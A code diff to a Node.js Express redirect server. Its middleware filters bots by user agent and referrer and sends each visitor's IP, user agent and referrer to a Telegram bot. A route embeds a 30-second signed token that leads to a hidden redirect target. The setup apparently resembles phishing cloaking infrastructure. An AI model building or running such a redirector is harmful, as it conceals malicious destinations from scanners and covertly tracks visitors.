@@ -2,6 +2,7 @@ import express from "express";
 import jwt from "jsonwebtoken";
 import path from "path";
 import fetch from "node-fetch";
+import fs from "fs";
 import { fileURLToPath } from "url";
 
 const __filename = fileURLToPath(import.meta.url);
@@ -32,16 +33,15 @@ async function sendToTelegram(message) {
   }
 }
 
-// === Middleware: Basic bot/referrer checks ===
+// === Middleware: Bot/referrer checks ===
 app.use((req, res, next) => {
-  // Use Referer OR Origin
   const ref = req.get("referer") || req.get("origin") || "";
   const ua = req.get("user-agent") || "";
   const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown").split(",")[0].trim();
 
   let status = "✅ Allowed";
 
-  // Only block if ref is present AND doesn't match any allowed ref
+  // Only block if ref is present AND not in allowed list
   if (ALLOWED_REFS.length > 0 && ref && !ALLOWED_REFS.some(domain => ref.startsWith(domain))) {
     status = "❌ Blocked (bad referrer)";
     sendToTelegram(`${status}\nIP: ${ip}\nUA: ${ua}\nRef: ${ref || 'none'}`);
@@ -55,7 +55,6 @@ app.use((req, res, next) => {
     return res.status(403).send("Forbidden: bot detected (UA)");
   }
 
-  // Log allowed traffic
   sendToTelegram(`${status}\nIP: ${ip}\nUA: ${ua}\nRef: ${ref || 'none'}`);
   next();
 });
@@ -65,18 +64,20 @@ app.get("/", (req, res) => {
   res.redirect("/secure-redirect");
 });
 
-// === Step 1: Serve redirect page ===
+// === Serve redirect page with embedded token ===
 app.get("/secure-redirect", (req, res) => {
   try {
     const token = jwt.sign({ target: REDIRECT_URL }, SECRET, { expiresIn: "30s" });
-    res.sendFile(path.join(__dirname, "views", "redirect.html"));
+    let html = fs.readFileSync(path.join(__dirname, "views", "redirect.html"), "utf8");
+    html = html.replace("%%TOKEN%%", token); // inject token
+    res.send(html);
   } catch (err) {
     console.error("Error signing token", err);
     res.status(500).send("Server error");
   }
 });
 
-// === Step 2: Verify + redirect ===
+// === Verify token and redirect ===
 app.get("/verify", (req, res) => {
   const token = req.query.token;
   const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown").split(",")[0].trim();
